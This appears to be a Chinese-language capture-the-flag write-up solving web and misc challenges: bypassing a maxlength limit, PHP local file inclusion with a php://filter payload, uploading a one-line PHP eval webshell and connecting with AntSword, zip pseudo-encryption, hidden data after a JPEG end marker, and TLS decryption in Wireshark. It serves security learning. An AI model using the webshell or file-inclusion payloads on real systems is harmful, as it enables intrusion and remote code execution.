
# web

## 计算器

![image-20250426184743067](image-20250426184743067.png)

![image-20250426184828683](image-20250426184828683.png)

### 解题

是一个计算器的，只能输入1位数,看一下源码

![image-20250426185422660](image-20250426185422660.png)

直接修改maxlength就行了

![image-20250426185507645](image-20250426185507645.png)

**flag:flag{652021af1d662c003cfcc7052dba52ac}**

## 你必须让他停下

![image-20250426185652636](image-20250426185652636.png)

![image-20250426185730958](image-20250426185730958.png)

### 解题

在许多张图片来回变，题目提示让它停下来

把js禁掉

![image-20250426190828010](image-20250426190828010.png)

不断ctrl+R，直到panda,

![image-20250426190937923](image-20250426190937923.png)

**flag:flag{f60833a5a574268d5a4857b22e0cc30e}**

## 文件包含

### 前置

php://filter/convert.base64-encode/resource

- **`php://filter`**：这是一个特殊的流包装器，其作用是对其他流进行过滤处理。你可以使用它对数据进行转换、编码或者解码等操作。
- **`convert.base64-encode`**：这是一个过滤器，其功能是把输入的数据进行 Base64 编码。Base64 编码是一种将二进制数据转换为可打印 ASCII 字符的编码方式，常用于在文本协议里传输二进制数据。
- **`resource`**：这里要指定一个资源，也就是需要进行过滤处理的数据源。该资源可以是本地文件、远程文件或者其他流。



### 题目

![image-20250426191528838](image-20250426191528838.png)

![image-20250426191618342](image-20250426191618342.png)

### 解题

点一下

![image-20250426191635171](image-20250426191635171.png)

有个file参数，给你index.php

用```php://filter/convert.base64-encode/resource=index.php```试试

```http://117.72.52.127:19263/index.php?file=php://filter/convert.base64-encode/resource=index.php```

访问后得到base64后的结果，一堆字符

```
77u/PGh0bWw+DQogICAgPHRpdGxlPkJ1Z2t1LXdlYjwvdGl0bGU+DQogICAgDQo8P3BocA0KCWVycm9yX3JlcG9ydGluZygwKTsNCglpZighJF9HRVRbZmlsZV0pe2VjaG8gJzxhIGhyZWY9Ii4vaW5kZXgucGhwP2ZpbGU9c2hvdy5waHAiPmNsaWNrIG1lPyBubzwvYT4nO30NCgkkZmlsZT0kX0dFVFsnZmlsZSddOw0KCWlmKHN0cnN0cigkZmlsZSwiLi4vIil8fHN0cmlzdHIoJGZpbGUsICJ0cCIpfHxzdHJpc3RyKCRmaWxlLCJpbnB1dCIpfHxzdHJpc3RyKCRmaWxlLCJkYXRhIikpew0KCQllY2hvICJPaCBubyEiOw0KCQlleGl0KCk7DQoJfQ0KCWluY2x1ZGUoJGZpbGUpOyANCi8vZmxhZzpmbGFnezRiNjE3ZjE4NzNiYjM1NWNkODgyZjAwY2VhOThlNzAyfQ0KPz4NCjwvaHRtbD4NCg==
```

解码一下

![image-20250426192744807](image-20250426192744807.png)

得到flag

**flag{4b617f1873bb355cd882f00cea98e702}**

## 文件包含2

### 题目

![image-20250426193538744](image-20250426193538744.png)

![image-20250426193811512](image-20250426193811512.png)

### 解题

还是先试试```php://filter/convert.base64-encode/resource=index.php```

![image-20250426193934925](image-20250426193934925.png)

说我天真。。。

看一下源码，发现最上面的注释upload.php

![image-20250426194103252](image-20250426194103252.png)

去upload看一下

![image-20250426194158005](image-20250426194158005.png)

一句话？看了下这题的评论，需要用像这样的一句话```<script language=php>echo 'a'; eval($_POST['pass']);</script>```

上传上去，bp抓包看一下

![image-20250426202420803](image-20250426202420803.png)

访问```http://117.72.52.127:13395/index.php/?file=upload/202504261221531122.jpg```，好像是成功了

![image-20250426202437669](image-20250426202437669.png)

蚁剑连上去，在根目录下找到了flag

![image-20250426203007854](image-20250426203007854.png)

**flag{6dc7c9d5175922ed15c8eae88ebbc1a2}**

### 疑问

为啥要用```<script language=php>```的形式？豆包说早期能这样执行php,但现在

> 现代的 Web 服务器大多不会识别 `<script language=php>` 来执行 PHP 代码，所以这段代码要能正常运行，服务器需要做特殊配置

# Misc

## zip伪加密

### zip结构

- 文件头
  - **本地文件头**：位于每个文件的开头，包含文件的相关信息，如文件名称、压缩方法、文件属性等。
  - **中央目录文件头**：位于 ZIP 文件的中间部分，包含了 ZIP 文件中所有文件和目录的信息，如文件名称、压缩后大小、未压缩大小、文件在 ZIP 文件中的偏移位置等。中央目录文件头可以包含多个文件头信息，每个文件头对应一个压缩文件或目录。
  - **结束标记**：位于 ZIP 文件的末尾，用于标识 ZIP 文件的结束。它包含了中央目录的大小、中央目录的起始位置等信息，以便解压程序能够正确地找到中央目录并读取其中的文件信息。
- **压缩数据**：紧跟在本地文件头之后，是实际的压缩数据。压缩数据是通过特定的压缩算法对原始文件进行压缩得到的，以减少文件的存储空间。
- **文件尾**：ZIP 文件结构的最后一部分是文件尾，它包含了一些关于 ZIP 文件的全局信息，如 ZIP 文件的版本号、压缩方式等。

看压缩包是否加密是看**全局方式位标记**

**全局方式位标记位于 ZIP 文件的本地文件头和中央目录文件头中。**

> 全局方式位标记的四个数字中只有第二个数字对其有影响，其它的不管为何值，都不影响它的加密属性，即：
> **第二个数字为奇数时 –>加密**
> **第二个数字为偶数时 –>未加密**
>
> 例如：0900/0100代表着加密，0000/0800代表着无加密
>
> 而**伪加密就是把本来无加密的文件修改了标志位从而显示出加密的样子**

#### 1.**无加密：**

> 压缩源文件数据区的**全局方式位标记**应当为00 00  （50 4B 03 04 14 00 后）
> 且压缩源文件目录区的**全局方式位标记**应当为00 00  （50 4B 01 02 14 00 后）

#### **2.伪加密：**

> 压缩源文件数据区的**全局方式位标记**应当为 00 00 （50 4B 03 04 14 00 后）
> 且压缩源文件目录区的**全局方式位标记**应当为 09 00  （50 4B 01 02 14 00 后）

#### **3.真加密：**

> 压缩源文件数据区的**全局方式位标记**应当为09 00 （50 4B 03 04 14 00 后） 
>
> 且压缩源文件目录区的**全局方式位标记**应当为09 00 （50 4B 01 02 14 00 后） 

### 题目

![image-20250426205203989](image-20250426205203989.png)

### 解题

拖进010

![image-20250426205310451](image-20250426205310451.png)

将50 4B 01 02后面的90 00改为00 00

![image-20250426210320614](image-20250426210320614.png)

压缩包打开了

![image-20250426210344518](image-20250426210344518.png)

**flag{Adm1N-B2G-kU-SZIP}**

## 图穷匕见

### 题目

![image-20250426210817082](image-20250426210817082.png)

### 解题

是个图片

![image-20250426210910076](image-20250426210910076.png)

010打开，发现里面的字符好有规律呀，并且在图片FF D9结束标志的后面

![image-20250426211059118](image-20250426211059118.png)

复制下来，厨子解码

![image-20250426212243179](image-20250426212243179.png)

发现是坐标，ai写个脚本

```python
import matplotlib.pyplot as plt


def read_coordinates(file_path):
    coordinates = []
    try:
        with open(file_path, 'r') as file:
            for line in file:
                line = line.strip()
                if line.startswith('(') and line.endswith(')'):
                    try:
                        x, y = map(int, line[1:-1].split(','))
                        coordinates.append((x, y))
                    except ValueError:
                        print(f"无法解析行: {line}")
    except FileNotFoundError:
        print("错误: 文件未找到!")
    return coordinates


def plot_points(coordinates):
    if coordinates:
        x_values = [point[0] for point in coordinates]
        y_values = [point[1] for point in coordinates]

        # 找出 x 和 y 坐标的最小值和最大值
        min_x = min(x_values)
        max_x = max(x_values)
        min_y = min(y_values)
        max_y = max(y_values)

        # 设置坐标轴范围，添加一定的边距
        margin = 1
        plt.xlim(min_x - margin, max_x + margin)
        plt.ylim(min_y - margin, max_y + margin)

        # 设置坐标轴刻度间隔为 1
        plt.xticks(range(int(min_x - margin), int(max_x + margin + 1), 1))
        plt.yticks(range(int(min_y - margin), int(max_y + margin + 1), 1))

        plt.scatter(x_values, y_values)
        plt.xlabel('X')
        plt.ylabel('Y')
        plt.title('Points from de.txt')
        plt.grid(True)
        plt.show()
    else:
        print("未找到有效的坐标。")


if __name__ == "__main__":
    file_path = 'de.txt'
    coordinates = read_coordinates(file_path)
    plot_points(coordinates)
    
```

![image-20250426215652330](image-20250426215652330.png)

**flag{40fc0a979f759c8892f4dc045e28b820}**

## TLS

### 题目

![image-20250426221817192](image-20250426221817192.png)

### 前置

> TLS 是传输层安全协议，用于加密网络通信，而 HTTP 是应用层协议，用于传输网页内容。在 HTTPS 中，**HTTP 数据包被封装在 TLS 数据包中进行加密传输。当 Wireshark 成功解密 TLS 数据包后，它会解析出内部的 HTTP 数据包，因此会显示 HTTP 协议数据包。**
>
> **简单来说**
> **TLS 是保护 HTTP 数据的“信封”，而在 Wireshark 中添加密钥解密后会直接显示里面的“信纸”（HTTP 数据）。**

### 解题

一个数据包，一个key，将数据包

![image-20250426222113024](image-20250426222113024.png)

里面都是TCP和TLS，一个http都没有

![image-20250426223410145](image-20250426223410145.png)

将RSA秘钥添加进去，多了2个http

> 添加的时候遇到了 麻烦一直显示Enter the password to open，搜一下
>
> **wireshark导入秘钥的路径不能有中文**

![image-20250426223655566](image-20250426223655566.png)

对http追踪流，有个key,flag{}包裹上提交上试试

![image-20250426223941508](image-20250426223941508.png)

**flag{39u7v25n1jxkl123}**
